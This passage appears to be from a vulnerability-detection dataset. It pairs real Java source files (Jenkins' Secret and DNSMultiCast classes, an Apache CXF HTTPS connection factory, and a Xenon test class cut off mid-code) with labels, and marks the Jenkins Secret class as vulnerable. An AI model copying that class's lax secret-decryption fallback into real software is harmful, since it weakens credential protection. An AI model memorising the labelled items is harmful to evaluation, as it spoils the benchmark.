{"idx": 1044, "func": "/*\n * The MIT License\n * \n * Copyright (c) 2004-2010, Sun Microsystems, Inc., Kohsuke Kawaguchi\n * \n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n * \n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n * \n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\npackage hudson.util;\n\nimport com.thoughtworks.xstream.converters.Converter;\nimport com.thoughtworks.xstream.converters.MarshallingContext;\nimport com.thoughtworks.xstream.converters.UnmarshallingContext;\nimport com.thoughtworks.xstream.io.HierarchicalStreamReader;\nimport com.thoughtworks.xstream.io.HierarchicalStreamWriter;\nimport com.trilead.ssh2.crypto.Base64;\nimport jenkins.model.Jenkins;\nimport hudson.Util;\nimport jenkins.security.CryptoConfidentialKey;\nimport org.kohsuke.stapler.Stapler;\n\nimport javax.crypto.SecretKey;\nimport javax.crypto.Cipher;\nimport java.io.Serializable;\nimport java.io.UnsupportedEncodingException;\nimport java.io.IOException;\nimport java.security.GeneralSecurityException;\nimport java.util.regex.Pattern;\nimport org.kohsuke.accmod.Restricted;\nimport org.kohsuke.accmod.restrictions.NoExternalUse;\n\n/**\n * Glorified {@link String} that uses encryption in the persisted form, to avoid accidental exposure of a secret.\n *\n * <p>\n * This is not meant as a protection against code running in the same VM, nor against an attacker\n * who has local file system access on Jenkins master.\n *\n * <p>\n * {@link Secret}s can correctly read-in plain text password, so this allows the existing\n * String field to be updated to {@link Secret}.\n *\n * @author Kohsuke Kawaguchi\n */\npublic final class Secret implements Serializable {\n    /**\n     * Unencrypted secret text.\n     */\n    private final String value;\n\n    private Secret(String value) {\n        this.value = value;\n    }\n\n    /**\n     * Obtains the secret in a plain text.\n     *\n     * @see #getEncryptedValue()\n     * @deprecated as of 1.356\n     *      Use {@link #toString(Secret)} to avoid NPE in case Secret is null.\n     *      Or if you really know what you are doing, use the {@link #getPlainText()} method.\n     */\n    @Override\n    @Deprecated\n    public String toString() {\n        return value;\n    }\n\n    /**\n     * Obtains the plain text password.\n     * Before using this method, ask yourself if you'd be better off using {@link Secret#toString(Secret)}\n     * to avoid NPE.\n     */\n    public String getPlainText() {\n        return value;\n    }\n\n    @Override\n    public boolean equals(Object that) {\n        return that instanceof Secret && value.equals(((Secret)that).value);\n    }\n\n    @Override\n    public int hashCode() {\n        return value.hashCode();\n    }\n\n    /**\n     * Turns {@link Jenkins#getSecretKey()} into an AES key.\n     *\n     * @deprecated\n     * This is no longer the key we use to encrypt new information, but we still need this\n     * to be able to decrypt what's already persisted.\n     */\n    @Deprecated\n    /*package*/ static SecretKey getLegacyKey() throws GeneralSecurityException {\n        String secret = SECRET;\n        if(secret==null)    return Jenkins.getInstance().getSecretKeyAsAES128();\n        return Util.toAes128Key(secret);\n    }\n\n    /**\n     * Encrypts {@link #value} and returns it in an encoded printable form.\n     *\n     * @see #toString() \n     */\n    public String getEncryptedValue() {\n        try {\n            Cipher cipher = KEY.encrypt();\n            // add the magic suffix which works like a check sum.\n            return new String(Base64.encode(cipher.doFinal((value+MAGIC).getBytes(\"UTF-8\"))));\n        } catch (GeneralSecurityException e) {\n            throw new Error(e); // impossible\n        } catch (UnsupportedEncodingException e) {\n            throw new Error(e); // impossible\n        }\n    }\n\n    /**\n     * Pattern matching a possible output of {@link #getEncryptedValue}.\n     * Basically, any Base64-encoded value.\n     * You must then call {@link #decrypt} to eliminate false positives.\n     */\n    @Restricted(NoExternalUse.class)\n    public static final Pattern ENCRYPTED_VALUE_PATTERN = Pattern.compile(\"[A-Za-z0-9+/]+={0,2}\");\n\n    /**\n     * Reverse operation of {@link #getEncryptedValue()}. Returns null\n     * if the given cipher text was invalid.\n     */\n    public static Secret decrypt(String data) {\n        if(data==null)      return null;\n        try {\n            byte[] in = Base64.decode(data.toCharArray());\n            Secret s = tryDecrypt(KEY.decrypt(), in);\n            if (s!=null)    return s;\n\n            // try our historical key for backward compatibility\n            Cipher cipher = getCipher(\"AES\");\n            cipher.init(Cipher.DECRYPT_MODE, getLegacyKey());\n            return tryDecrypt(cipher, in);\n        } catch (GeneralSecurityException e) {\n            return null;\n        } catch (UnsupportedEncodingException e) {\n            throw new Error(e); // impossible\n        } catch (IOException e) {\n            return null;\n        }\n    }\n\n    /*package*/ static Secret tryDecrypt(Cipher cipher, byte[] in) throws UnsupportedEncodingException {\n        try {\n            String plainText = new String(cipher.doFinal(in), \"UTF-8\");\n            if(plainText.endsWith(MAGIC))\n                return new Secret(plainText.substring(0,plainText.length()-MAGIC.length()));\n            return null;\n        } catch (GeneralSecurityException e) {\n            return null; // if the key doesn't match with the bytes, it can result in BadPaddingException\n        }\n    }\n\n    /**\n     * Workaround for JENKINS-6459 / http://java.net/jira/browse/GLASSFISH-11862\n     * This method uses specific provider selected via hudson.util.Secret.provider system property\n     * to provide a workaround for the above bug where default provide gives an unusable instance.\n     * (Glassfish Enterprise users should set value of this property to \"SunJCE\")\n     */\n    public static Cipher getCipher(String algorithm) throws GeneralSecurityException {\n        return PROVIDER != null ? Cipher.getInstance(algorithm, PROVIDER)\n                                : Cipher.getInstance(algorithm);\n    }\n\n    /**\n     * Attempts to treat the given string first as a cipher text, and if it doesn't work,\n     * treat the given string as the unencrypted secret value.\n     *\n     * <p>\n     * Useful for recovering a value from a form field.\n     *\n     * @return never null\n     */\n    public static Secret fromString(String data) {\n        data = Util.fixNull(data);\n        Secret s = decrypt(data);\n        if(s==null) s=new Secret(data);\n        return s;\n    }\n\n    /**\n     * Works just like {@link Secret#toString()} but avoids NPE when the secret is null.\n     * To be consistent with {@link #fromString(String)}, this method doesn't distinguish\n     * empty password and null password.\n     */\n    public static String toString(Secret s) {\n        return s==null ? \"\" : s.value;\n    }\n\n    public static final class ConverterImpl implements Converter {\n        public ConverterImpl() {\n        }\n\n        public boolean canConvert(Class type) {\n            return type==Secret.class;\n        }\n\n        public void marshal(Object source, HierarchicalStreamWriter writer, MarshallingContext context) {\n            Secret src = (Secret) source;\n            writer.setValue(src.getEncryptedValue());\n        }\n\n        public Object unmarshal(HierarchicalStreamReader reader, final UnmarshallingContext context) {\n            return fromString(reader.getValue());\n        }\n    }\n\n    private static final String MAGIC = \"::::MAGIC::::\";\n\n    /**\n     * Workaround for JENKINS-6459 / http://java.net/jira/browse/GLASSFISH-11862\n     * @see #getCipher(String)\n     */\n    private static final String PROVIDER = System.getProperty(Secret.class.getName()+\".provider\");\n\n    /**\n     * For testing only. Override the secret key so that we can test this class without {@link Jenkins}.\n     */\n    /*package*/ static String SECRET = null;\n\n    /**\n     * The key that encrypts the data on disk.\n     */\n    private static final CryptoConfidentialKey KEY = new CryptoConfidentialKey(Secret.class.getName());\n\n    private static final long serialVersionUID = 1L;\n\n    static {\n        Stapler.CONVERT_UTILS.register(new org.apache.commons.beanutils.Converter() {\n            public Secret convert(Class type, Object value) {\n                return Secret.fromString(value.toString());\n            }\n        }, Secret.class);\n    }\n}\n", "target": 1}
{"idx": 1045, "func": "package hudson;\n\nimport jenkins.model.Jenkins;\nimport jenkins.model.Jenkins.MasterComputer;\n\nimport javax.jmdns.JmDNS;\nimport javax.jmdns.ServiceInfo;\nimport java.io.Closeable;\nimport java.io.IOException;\nimport java.net.URL;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.concurrent.Callable;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\n/**\n * Registers a DNS multi-cast service-discovery support.\n *\n * @author Kohsuke Kawaguchi\n */\npublic class DNSMultiCast implements Closeable {\n    private JmDNS jmdns;\n\n    public DNSMultiCast(final Jenkins jenkins) {\n        if (disabled)   return; // escape hatch\n        \n        // the registerService call can be slow. run these asynchronously\n        MasterComputer.threadPoolForRemoting.submit(new Callable<Object>() {\n            public Object call() {\n                try {\n                    jmdns = JmDNS.create();\n\n                    Map<String,String> props = new HashMap<String, String>();\n                    String rootURL = jenkins.getRootUrl();\n                    if (rootURL==null)  return null;\n\n                    props.put(\"url\", rootURL);\n                    try {\n                        props.put(\"version\",String.valueOf(Jenkins.getVersion()));\n                    } catch (IllegalArgumentException e) {\n                        // failed to parse the version number\n                    }\n\n                    TcpSlaveAgentListener tal = jenkins.getTcpSlaveAgentListener();\n                    if (tal!=null)\n                        props.put(\"slave-port\",String.valueOf(tal.getPort()));\n\n                    props.put(\"server-id\", jenkins.getLegacyInstanceId());\n\n                    URL jenkins_url = new URL(rootURL);\n                    int jenkins_port = jenkins_url.getPort();\n                    if (jenkins_port == -1) {\n                        jenkins_port = 80;\n                    }\n                    if (jenkins_url.getPath().length() > 0) {\n                        props.put(\"path\", jenkins_url.getPath());\n                    }\n\n                    jmdns.registerService(ServiceInfo.create(\"_hudson._tcp.local.\",\"jenkins\",\n                            jenkins_port,0,0,props));\t// for backward compatibility\n                    jmdns.registerService(ServiceInfo.create(\"_jenkins._tcp.local.\",\"jenkins\",\n                            jenkins_port,0,0,props));\n\n                    // Make Jenkins appear in Safari's Bonjour bookmarks\n                    jmdns.registerService(ServiceInfo.create(\"_http._tcp.local.\",\"Jenkins\",\n                            jenkins_port,0,0,props));\n                } catch (IOException e) {\n                    LOGGER.log(Level.WARNING,\"Failed to advertise the service to DNS multi-cast\",e);\n                }\n                return null;\n            }\n        });\n    }\n\n    public void close() {\n        if (jmdns!=null) {\n//            try {\n                jmdns.abort();\n                jmdns = null;\n//            } catch (final IOException e) {\n//                LOGGER.log(Level.WARNING,\"Failed to close down JmDNS instance!\",e);\n//            }\n        }\n    }\n\n    private static final Logger LOGGER = Logger.getLogger(DNSMultiCast.class.getName());\n\n    public static boolean disabled = Boolean.getBoolean(DNSMultiCast.class.getName()+\".disabled\");\n}\n", "target": 0}
{"idx": 1046, "func": "/**\n * Licensed to the Apache Software Foundation (ASF) under one\n * or more contributor license agreements. See the NOTICE file\n * distributed with this work for additional information\n * regarding copyright ownership. The ASF licenses this file\n * to you under the Apache License, Version 2.0 (the\n * \"License\"); you may not use this file except in compliance\n * with the License. You may obtain a copy of the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing,\n * software distributed under the License is distributed on an\n * \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n * KIND, either express or implied. See the License for the\n * specific language governing permissions and limitations\n * under the License.\n */\n\npackage org.apache.cxf.transport.https;\n\nimport java.io.IOException;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Method;\nimport java.net.HttpURLConnection;\nimport java.net.Proxy;\nimport java.net.URL;\nimport java.security.GeneralSecurityException;\nimport java.util.logging.Handler;\nimport java.util.logging.Logger;\n\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSocketFactory;\n\nimport org.apache.cxf.common.logging.LogUtils;\nimport org.apache.cxf.common.util.ReflectionInvokationHandler;\nimport org.apache.cxf.common.util.ReflectionUtil;\nimport org.apache.cxf.configuration.jsse.SSLUtils;\nimport org.apache.cxf.configuration.jsse.TLSClientParameters;\n\n\n/**\n * This HttpsURLConnectionFactory implements the HttpURLConnectionFactory\n * for using the given SSL Policy to configure TLS connections for \"https:\"\n * URLs.\n */\npublic class HttpsURLConnectionFactory {\n\n    /**\n     * This constant holds the URL Protocol Identifier for HTTPS\n     */\n    public static final String HTTPS_URL_PROTOCOL_ID = \"https\";\n\n    private static final Logger LOG =\n        LogUtils.getL7dLogger(HttpsURLConnectionFactory.class);\n\n    private static boolean weblogicWarned;\n\n    /**\n     * Cache the last SSLContext to avoid recreation\n     */\n    SSLSocketFactory socketFactory;\n    int lastTlsHash;\n\n    /**\n     * This constructor initialized the factory with the configured TLS\n     * Client Parameters for the HTTPConduit for which this factory is used.\n     */\n    public HttpsURLConnectionFactory() {\n    }\n\n    /**\n     * Create a HttpURLConnection, proxified if necessary.\n     *\n     *\n     * @param proxy This parameter is non-null if connection should be proxied.\n     * @param url   The target URL.\n     *\n     * @return The HttpURLConnection for the given URL.\n     * @throws IOException\n     */\n    public HttpURLConnection createConnection(TLSClientParameters tlsClientParameters,\n            Proxy proxy, URL url) throws IOException {\n\n        HttpURLConnection connection =\n            (HttpURLConnection) (proxy != null\n                                   ? url.openConnection(proxy)\n                                   : url.openConnection());\n        if (HTTPS_URL_PROTOCOL_ID.equals(url.getProtocol())) {\n\n            if (tlsClientParameters == null) {\n                tlsClientParameters = new TLSClientParameters();\n            }\n\n            try {\n                decorateWithTLS(tlsClientParameters, connection);\n            } catch (Throwable ex) {\n                if (ex instanceof IOException) {\n                    throw (IOException) ex;\n                }\n                IOException ioException = new IOException(\"Error while initializing secure socket\", ex);\n                throw ioException;\n            }\n        }\n\n        return connection;\n    }\n\n    /**\n     * This method assigns the various TLS parameters on the HttpsURLConnection\n     * from the TLS Client Parameters. Connection parameter is of supertype HttpURLConnection,\n     * which allows internal cast to potentially divergent subtype (https) implementations.\n     */\n    protected synchronized void decorateWithTLS(TLSClientParameters tlsClientParameters,\n            HttpURLConnection connection) throws GeneralSecurityException {\n\n\n        int hash = tlsClientParameters.hashCode();\n        if (hash != lastTlsHash) {\n            lastTlsHash = hash;\n            socketFactory = null;\n        }\n\n        // always reload socketFactory from HttpsURLConnection.defaultSSLSocketFactory and\n        // tlsClientParameters.sslSocketFactory to allow runtime configuration change\n        if (tlsClientParameters.isUseHttpsURLConnectionDefaultSslSocketFactory()) {\n            socketFactory = HttpsURLConnection.getDefaultSSLSocketFactory();\n\n        } else if (tlsClientParameters.getSSLSocketFactory() != null) {\n            // see if an SSLSocketFactory was set. This allows easy interop\n            // with not-yet-commons-ssl.jar, or even just people who like doing their\n            // own JSSE.\n            socketFactory = tlsClientParameters.getSSLSocketFactory();\n\n        } else if (socketFactory == null) {\n            // ssl socket factory not yet instantiated, create a new one with tlsClientParameters's Trust\n            // Managers, Key Managers, etc\n\n            SSLContext ctx =\n                org.apache.cxf.transport.https.SSLUtils.getSSLContext(tlsClientParameters);\n\n            String[] cipherSuites =\n                SSLUtils.getCiphersuitesToInclude(tlsClientParameters.getCipherSuites(),\n                                                  tlsClientParameters.getCipherSuitesFilter(),\n                                                  ctx.getSocketFactory().getDefaultCipherSuites(),\n                                                  SSLUtils.getSupportedCipherSuites(ctx),\n                                                  LOG);\n            // The SSLSocketFactoryWrapper enables certain cipher suites\n            // from the policy.\n            String protocol = tlsClientParameters.getSecureSocketProtocol() != null ? tlsClientParameters\n                .getSecureSocketProtocol() : \"TLS\";\n            socketFactory = new SSLSocketFactoryWrapper(ctx.getSocketFactory(), cipherSuites,\n                                                        protocol);\n            //recalc the hashcode since some of the above MAY have changed the tlsClientParameters\n            lastTlsHash = tlsClientParameters.hashCode();\n        } else {\n           // ssl socket factory already initialized, reuse it to benefit of keep alive\n        }\n\n\n        HostnameVerifier verifier = org.apache.cxf.transport.https.SSLUtils\n            .getHostnameVerifier(tlsClientParameters);\n\n        if (connection instanceof HttpsURLConnection) {\n            // handle the expected case (javax.net.ssl)\n            HttpsURLConnection conn = (HttpsURLConnection) connection;\n            conn.setHostnameVerifier(verifier);\n            conn.setSSLSocketFactory(socketFactory);\n        } else {\n            // handle the deprecated sun case and other possible hidden API's\n            // that are similar to the Sun cases\n            try {\n                Method method = connection.getClass().getMethod(\"getHostnameVerifier\");\n\n                InvocationHandler handler = new ReflectionInvokationHandler(verifier) {\n                    public Object invoke(Object proxy,\n                                         Method method,\n                                         Object[] args) throws Throwable {\n                        try {\n                            return super.invoke(proxy, method, args);\n                        } catch (Exception ex) {\n                            return false;\n                        }\n                    }\n                };\n                Object proxy = java.lang.reflect.Proxy.newProxyInstance(this.getClass().getClassLoader(),\n                                                                        new Class[] {method.getReturnType()},\n                                                                        handler);\n\n                method = connection.getClass().getMethod(\"setHostnameVerifier\", method.getReturnType());\n                method.invoke(connection, proxy);\n            } catch (Exception ex) {\n                //Ignore this one\n            }\n            try {\n                Method getSSLSocketFactory = connection.getClass().getMethod(\"getSSLSocketFactory\");\n                Method setSSLSocketFactory = connection.getClass()\n                    .getMethod(\"setSSLSocketFactory\", getSSLSocketFactory.getReturnType());\n                if (getSSLSocketFactory.getReturnType().isInstance(socketFactory)) {\n                    setSSLSocketFactory.invoke(connection, socketFactory);\n                } else {\n                    //need to see if we can create one - mostly the weblogic case.   The\n                    //weblogic SSLSocketFactory has a protected constructor that can take\n                    //a JSSE SSLSocketFactory so we'll try and use that\n                    Constructor<?> c = getSSLSocketFactory.getReturnType()\n                        .getDeclaredConstructor(SSLSocketFactory.class);\n                    ReflectionUtil.setAccessible(c);\n                    setSSLSocketFactory.invoke(connection, c.newInstance(socketFactory));\n                }\n            } catch (Exception ex) {\n                if (connection.getClass().getName().contains(\"weblogic\")) {\n                    if (!weblogicWarned) {\n                        weblogicWarned = true;\n                        LOG.warning(\"Could not configure SSLSocketFactory on Weblogic.  \"\n                                    + \" Use the Weblogic control panel to configure the SSL settings.\");\n                    }\n                    return;\n                }\n                //if we cannot set the SSLSocketFactory, we're in serious trouble.\n                throw new IllegalArgumentException(\"Error decorating connection class \"\n                        + connection.getClass().getName(), ex);\n            }\n        }\n    }\n\n    /*\n     *  For development and testing only\n     */\n    protected void addLogHandler(Handler handler) {\n        LOG.addHandler(handler);\n    }\n\n}\n\n\n\n", "target": 0}
{"idx": 1047, "func": "/*\n * Copyright (c) 2014-2015 VMware, Inc. All Rights Reserved.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\"); you may not\n * use this file except in compliance with the License.  You may obtain a copy of\n * the License at http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software distributed\n * under the License is distributed on an \"AS IS\" BASIS, without warranties or\n * conditions of any kind, EITHER EXPRESS OR IMPLIED.  See the License for the\n * specific language governing permissions and limitations under the License.\n */\n\npackage com.vmware.xenon.common;\n\nimport static org.junit.Assert.assertEquals;\nimport static org.junit.Assert.assertNotEquals;\nimport static org.junit.Assert.assertTrue;\n\nimport static com.vmware.xenon.common.ServiceHost.SERVICE_URI_SUFFIX_SYNCHRONIZATION;\nimport static com.vmware.xenon.common.ServiceHost.SERVICE_URI_SUFFIX_TEMPLATE;\nimport static com.vmware.xenon.common.ServiceHost.SERVICE_URI_SUFFIX_UI;\n\nimport java.net.URI;\nimport java.util.ArrayList;\nimport java.util.EnumSet;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.UUID;\nimport java.util.concurrent.TimeUnit;\nimport java.util.function.Consumer;\n\nimport org.junit.Before;\nimport org.junit.Test;\n\nimport com.vmware.xenon.common.Service.ServiceOption;\nimport com.vmware.xenon.common.ServiceStats.ServiceStat;\nimport com.vmware.xenon.common.ServiceStats.ServiceStatLogHistogram;\nimport com.vmware.xenon.common.ServiceStats.TimeSeriesStats;\nimport com.vmware.xenon.common.ServiceStats.TimeSeriesStats.AggregationType;\nimport com.vmware.xenon.common.ServiceStats.TimeSeriesStats.TimeBin;\nimport com.vmware.xenon.common.test.AuthTestUtils;\nimport com.vmware.xenon.common.test.TestContext;\nimport com.vmware.xenon.common.test.TestRequestSender;\nimport com.vmware.xenon.common.test.TestRequestSender.FailureResponse;\nimport com.vmware.xenon.common.test.VerificationHost;\nimport com.vmware.xenon.services.common.AuthorizationContextService;\nimport com.vmware.xenon.services.common.ExampleService;\nimport com.vmware.xenon.services.common.ExampleService.ExampleServiceState;\nimport com.vmware.xenon.services.common.MinimalTestService;\nimport com.vmware.xenon.services.common.QueryTask.Query;\nimport com.vmware.xenon.services.common.ServiceUriPaths;\n\npublic class TestUtilityService extends BasicReusableHostTestCase {\n\n    @Before\n    public void setUp() {\n        // We tell the verification host that we re-use it across test methods. This enforces\n        // the use of TestContext, to isolate test methods from each other.\n        // In this test class we host.testCreate(count) to get an isolated test context and\n        // then either wait on the context itself, or ask the convenience method host.testWait(ctx)\n        // to do it for us.\n        this.host.setSingleton(true);\n    }\n\n    @Test\n    public void patchConfiguration() throws Throwable {\n        int count = 10;\n\n        host.waitForServiceAvailable(ExampleService.FACTORY_LINK);\n        // try config patch on a factory\n        ServiceConfigUpdateRequest updateBody = ServiceConfigUpdateRequest.create();\n        updateBody.removeOptions = EnumSet.of(ServiceOption.IDEMPOTENT_POST);\n        TestContext ctx = this.testCreate(1);\n\n        URI configUri = UriUtils.buildConfigUri(host, ExampleService.FACTORY_LINK);\n        this.host.send(Operation.createPatch(configUri).setBody(updateBody)\n                .setCompletion(ctx.getCompletion()));\n\n        this.testWait(ctx);\n\n        TestContext ctx2 = this.testCreate(1);\n        // verify option removed\n        this.host.send(Operation.createGet(configUri).setCompletion((o, e) -> {\n            if (e != null) {\n                ctx2.failIteration(e);\n                return;\n            }\n\n            ServiceConfiguration cfg = o.getBody(ServiceConfiguration.class);\n            if (!cfg.options.contains(ServiceOption.IDEMPOTENT_POST)) {\n                ctx2.completeIteration();\n            } else {\n                ctx2.failIteration(new IllegalStateException(Utils.toJsonHtml(cfg)));\n            }\n\n        }));\n\n        this.testWait(ctx2);\n\n        List<URI> services = this.host.createExampleServices(this.host, count, null);\n\n        updateBody = ServiceConfigUpdateRequest.create();\n        updateBody.addOptions = EnumSet.of(ServiceOption.PERIODIC_MAINTENANCE);\n        updateBody.peerNodeSelectorPath = ServiceUriPaths.DEFAULT_1X_NODE_SELECTOR;\n        ctx = this.testCreate(services.size());\n        for (URI u : services) {\n            configUri = UriUtils.buildConfigUri(u);\n            this.host.send(Operation.createPatch(configUri).setBody(updateBody)\n                    .setCompletion(ctx.getCompletion()));\n        }\n        this.testWait(ctx);\n\n        // get configuration and verify options\n        TestContext ctx3 = testCreate(services.size());\n        for (URI serviceUri : services) {\n            URI u = UriUtils.buildConfigUri(serviceUri);\n            host.send(Operation.createGet(u).setCompletion((o, e) -> {\n                if (e != null) {\n                    ctx3.failIteration(e);\n                    return;\n                }\n                ServiceConfiguration cfg = o.getBody(ServiceConfiguration.class);\n                if (!cfg.options.contains(ServiceOption.PERIODIC_MAINTENANCE)) {\n                    ctx3.failIteration(new IllegalStateException(Utils.toJsonHtml(cfg)));\n                    return;\n                }\n\n                if (!ServiceUriPaths.DEFAULT_1X_NODE_SELECTOR.equals(cfg.peerNodeSelectorPath)) {\n                    ctx3.failIteration(new IllegalStateException(Utils.toJsonHtml(cfg)));\n                    return;\n                }\n                ctx3.completeIteration();\n            }));\n        }\n        testWait(ctx3);\n\n        // since we enabled periodic maintenance, verify the new maintenance related stat is present\n        this.host.waitFor(\"maintenance stat not present\", () -> {\n            for (URI u : services) {\n                Map<String, ServiceStat> stats = this.host.getServiceStats(u);\n                ServiceStat maintStat = stats.get(Service.STAT_NAME_MAINTENANCE_COUNT);\n                if (maintStat == null) {\n                    return false;\n                }\n                if (maintStat.latestValue == 0) {\n                    return false;\n                }\n            }\n            return true;\n        });\n\n    }\n\n    @Test\n    public void redirectToUiServiceIndex() throws Throwable {\n        // create an example child service and also verify it has a default UI html page\n        ExampleServiceState s = new ExampleServiceState();\n        s.name = UUID.randomUUID().toString();\n        s.documentSelfLink = s.name;\n        Operation post = Operation\n                .createPost(UriUtils.buildFactoryUri(this.host, ExampleService.class))\n                .setBody(s);\n        this.host.sendAndWaitExpectSuccess(post);\n\n        // do a get on examples/ui and examples/<uuid>/ui, twice to test the code path that caches\n        // the resource file lookup\n        for (int i = 0; i < 2; i++) {\n            Operation htmlResponse = this.host.sendUIHttpRequest(\n                    UriUtils.buildUri(\n                            this.host,\n                            UriUtils.buildUriPath(ExampleService.FACTORY_LINK,\n                                    ServiceHost.SERVICE_URI_SUFFIX_UI))\n                            .toString(), null, 1);\n\n            validateServiceUiHtmlResponse(htmlResponse);\n\n            htmlResponse = this.host.sendUIHttpRequest(\n                    UriUtils.buildUri(\n                            this.host,\n                            UriUtils.buildUriPath(ExampleService.FACTORY_LINK, s.name,\n                                    ServiceHost.SERVICE_URI_SUFFIX_UI))\n                            .toString(), null, 1);\n\n            validateServiceUiHtmlResponse(htmlResponse);\n        }\n    }\n\n    @Test\n    public void statRESTActions() throws Throwable {\n        String name = UUID.randomUUID().toString();\n        ExampleServiceState s = new ExampleServiceState();\n        s.name = name;\n        Consumer<Operation> bodySetter = (o) -> {\n            o.setBody(s);\n        };\n        URI factoryURI = UriUtils.buildFactoryUri(this.host, ExampleService.class);\n        long c = 2;\n        Map<URI, ExampleServiceState> states = this.host.doFactoryChildServiceStart(null, c,\n                ExampleServiceState.class, bodySetter, factoryURI);\n        ExampleServiceState exampleServiceState = states.values().iterator().next();\n        // Step 2 - POST a stat to the service instance and verify we can fetch the stat just posted\n        ServiceStats.ServiceStat stat = new ServiceStat();\n        stat.name = \"key1\";\n        stat.latestValue = 100;\n        stat.unit = \"unit\";\n        this.host.sendAndWaitExpectSuccess(Operation.createPost(UriUtils.buildStatsUri(\n                this.host, exampleServiceState.documentSelfLink)).setBody(stat));\n        ServiceStats allStats = this.host.getServiceState(null, ServiceStats.class,\n                UriUtils.buildStatsUri(\n                        this.host, exampleServiceState.documentSelfLink));\n        ServiceStat retStatEntry = allStats.entries.get(\"key1\");\n        assertTrue(retStatEntry.accumulatedValue == 100);\n        assertTrue(retStatEntry.latestValue == 100);\n        assertTrue(retStatEntry.version == 1);\n        assertTrue(retStatEntry.unit.equals(\"unit\"));\n        assertTrue(retStatEntry.sourceTimeMicrosUtc == null);\n\n        // Step 3 - POST a stat with the same key again and verify that the\n        // version and accumulated value are updated\n        stat.latestValue = 50;\n        stat.unit = \"unit1\";\n        Long updatedMicrosUtc1 = Utils.getNowMicrosUtc();\n        stat.sourceTimeMicrosUtc = updatedMicrosUtc1;\n        this.host.sendAndWaitExpectSuccess(Operation.createPost(UriUtils.buildStatsUri(\n                this.host, exampleServiceState.documentSelfLink)).setBody(stat));\n        allStats = getStats(exampleServiceState);\n        retStatEntry = allStats.entries.get(\"key1\");\n        assertTrue(retStatEntry.accumulatedValue == 150);\n        assertTrue(retStatEntry.latestValue == 50);\n        assertTrue(retStatEntry.version == 2);\n        assertTrue(retStatEntry.unit.equals(\"unit1\"));\n        assertTrue(retStatEntry.sourceTimeMicrosUtc == updatedMicrosUtc1);\n\n        // Step 4 - POST a stat with a new key and verify that the\n        // previously posted stat is not updated\n        stat.name = \"key2\";\n        stat.latestValue = 50;\n        stat.unit = \"unit2\";\n        Long updatedMicrosUtc2 = Utils.getNowMicrosUtc();\n        stat.sourceTimeMicrosUtc = updatedMicrosUtc2;\n        this.host.sendAndWaitExpectSuccess(Operation.createPost(UriUtils.buildStatsUri(\n                this.host, exampleServiceState.documentSelfLink)).setBody(stat));\n        allStats = getStats(exampleServiceState);\n        retStatEntry = allStats.entries.get(\"key1\");\n        assertTrue(retStatEntry.accumulatedValue == 150);\n        assertTrue(retStatEntry.latestValue == 50);\n        assertTrue(retStatEntry.version == 2);\n        assertTrue(retStatEntry.unit.equals(\"unit1\"));\n        assertTrue(retStatEntry.sourceTimeMicrosUtc == updatedMicrosUtc1);\n\n        retStatEntry = allStats.entries.get(\"key2\");\n        assertTrue(retStatEntry.accumulatedValue == 50);\n        assertTrue(retStatEntry.latestValue == 50);\n        assertTrue(retStatEntry.version == 1);\n        assertTrue(retStatEntry.unit.equals(\"unit2\"));\n        assertTrue(retStatEntry.sourceTimeMicrosUtc == updatedMicrosUtc2);\n\n        // Step 5 - Issue a PUT for the first stat key and verify that the doc state is replaced\n        stat.name = \"key1\";\n        stat.latestValue = 75;\n        stat.unit = \"replaceUnit\";\n        stat.sourceTimeMicrosUtc = null;\n        this.host.sendAndWaitExpectSuccess(Operation.createPut(UriUtils.buildStatsUri(\n                this.host, exampleServiceState.documentSelfLink)).setBody(stat));\n        allStats = getStats(exampleServiceState);\n        retStatEntry = allStats.entries.get(\"key1\");\n        assertTrue(retStatEntry.accumulatedValue == 75);\n        assertTrue(retStatEntry.latestValue == 75);\n        assertTrue(retStatEntry.version == 1);\n        assertTrue(retStatEntry.unit.equals(\"replaceUnit\"));\n        assertTrue(retStatEntry.sourceTimeMicrosUtc == null);\n\n        // Step 6 - Issue a bulk PUT and verify that the complete set of stats is updated\n        ServiceStats stats = new ServiceStats();\n        stat.name = \"key3\";\n        stat.latestValue = 200;\n        stat.unit = \"unit3\";\n        stats.entries.put(\"key3\", stat);\n        this.host.sendAndWaitExpectSuccess(Operation.createPut(UriUtils.buildStatsUri(\n                this.host, exampleServiceState.documentSelfLink)).setBody(stats));\n        allStats = getStats(exampleServiceState);\n        if (allStats.entries.size() != 1) {\n            // there is a possibility of node group maintenance kicking in and adding a stat\n            ServiceStat nodeGroupStat = allStats.entries.get(\n                    Service.STAT_NAME_NODE_GROUP_CHANGE_MAINTENANCE_COUNT);\n\n            if (nodeGroupStat == null) {\n                throw new IllegalStateException(\n                        \"Expected single stat, got: \" + Utils.toJsonHtml(allStats));\n            }\n        }\n        retStatEntry = allStats.entries.get(\"key3\");\n        assertTrue(retStatEntry.accumulatedValue == 200);\n        